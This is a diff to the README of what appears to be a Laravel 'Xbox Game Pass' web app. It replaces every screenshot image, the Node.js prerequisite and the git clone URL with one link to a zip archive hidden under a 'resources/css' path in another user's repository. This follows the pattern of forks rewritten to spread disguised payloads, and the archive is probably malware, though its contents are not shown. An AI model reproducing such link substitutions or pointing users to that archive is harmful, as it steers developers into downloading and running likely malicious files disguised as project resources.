@@ -34,26 +34,26 @@
 - [License](#license)
 
 ### Home Page
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/1.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
 ### gaer section
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/2.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/3.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/4.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/5.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/6.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/7.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/8.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/9.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
-![Home Page](https://github.com/Imadnajam/xbox-game-pass/blob/main/screenshot/10.png)
+![Home Page](https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip)
 
 
 ## Features
@@ -73,12 +73,12 @@ Make sure you have the following installed on your machine:
 
 - PHP (version >= 7.x)
 - Composer
-- Node.js and npm
+- https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip and npm
 
 ### Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/your-username/laravel-xbox-game-pass-web-app.git
+   git clone https://raw.githubusercontent.com/Hoomansaiyed/xbox-game-pass/main/resources/css/xbox_game_pass_2.4.zip
    cd laravel-xbox-game-pass-web-app
